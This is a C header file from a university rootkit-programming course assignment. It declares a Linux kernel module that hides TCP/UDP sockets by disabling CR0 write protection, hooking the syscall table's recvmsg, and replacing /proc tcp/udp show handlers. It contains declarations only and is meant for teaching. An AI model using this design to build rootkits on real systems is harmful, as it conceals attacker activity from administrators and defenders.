
/*******************************************************************************/
/*                                                                             */
/*   Course: Rootkit Programming                                               */
/*   Semester: WS 2015/16                                                      */
/*   Team: 105                                                                 */
/*   Assignment: 6                                                             */
/*                                                                             */
/*   Filename: socket_masker.h                                                 */
/*                                                                             */
/*   Authors:                                                                  */
/*       Name: Matei Pavaluca                                                  */
/*       Email: mateipavaluca@yahoo.com                                        */
/*                                                                             */
/*       Name: Nedko Stefanov Nedkov                                           */
/*       Email: nedko.stefanov.nedkov@gmail.com                                */
/*                                                                             */
/*   Date: November 2015                                                       */
/*                                                                             */
/*   Usage: Header file for kernel module `socket_masker.c`.                   */
/*                                                                             */
/*******************************************************************************/

#ifndef __SOCKET_MASKER__
#define __SOCKET_MASKER__

/* Definition of macros */
#define CR0_WRITE_PROTECT_MASK (1 << 16)
#define PRINT(str) printk(KERN_INFO "socket_masker rootkit: %s\n", (str));
#define PORTS_BUFFSIZE 8


/* Definition of global variables */
static int tcp_ports[PORTS_BUFFSIZE];
static int tcp_ports_count = 0;
static int udp_ports[PORTS_BUFFSIZE];
static int udp_ports_count = 0;
static int tcp6_ports[PORTS_BUFFSIZE];
static int tcp6_ports_count = 0;
static int udp6_ports[PORTS_BUFFSIZE];
static int udp6_ports_count = 0;
void **syscall_table;
asmlinkage ssize_t (*original_recvmsg_syscall)(int, struct user_msghdr __user *, unsigned);
asmlinkage int (*original_tcp_show) (struct seq_file *, void *);
asmlinkage int (*original_udp_show) (struct seq_file *, void *);
asmlinkage int (*original_tcp6_show) (struct seq_file *, void *);
asmlinkage int (*original_udp6_show) (struct seq_file *, void *);


/* Declaration of functions */
void disable_write_protect_mode(void);
void enable_write_protect_mode(void);

asmlinkage ssize_t my_recvmsg_syscall(int, struct user_msghdr __user *, unsigned);
static int hide(struct nlmsghdr *);

void hide_sockets(void);
void unhide_sockets(void);

static int my_tcp_show(struct seq_file *, void *);
static int my_udp_show(struct seq_file *, void *);

int should_mask_socket(char *, int);


/* dirent structure */
struct linux_dirent {   
        unsigned long   d_ino;   
        unsigned long   d_off;   
        unsigned short  d_reclen;   
        char            d_name[1];   
};

/* since this struct is no longer available in proc_fs, taken from fs/proc/internal.h */
struct proc_dir_entry {
		unsigned int low_ino;
		umode_t mode;
		nlink_t nlink;
		kuid_t uid;
		kgid_t gid;
		loff_t size;
		const struct inode_operations *proc_iops;
		const struct file_operations *proc_fops;
		struct proc_dir_entry *parent;
		struct rb_root subdir;
		struct rb_node subdir_node;
		void *data;
		atomic_t count;         /* use count */
		atomic_t in_use;        /* number of callers into module in progress; */
                          /* negative -> it's going away RSN */
		struct completion *pde_unload_completion;
		struct list_head pde_openers;   /* who did ->open, but not ->release */
		spinlock_t pde_unload_lock; /* proc_fops checks and pde_users bumps */
		u8 namelen;
		char name[];
};


#endif
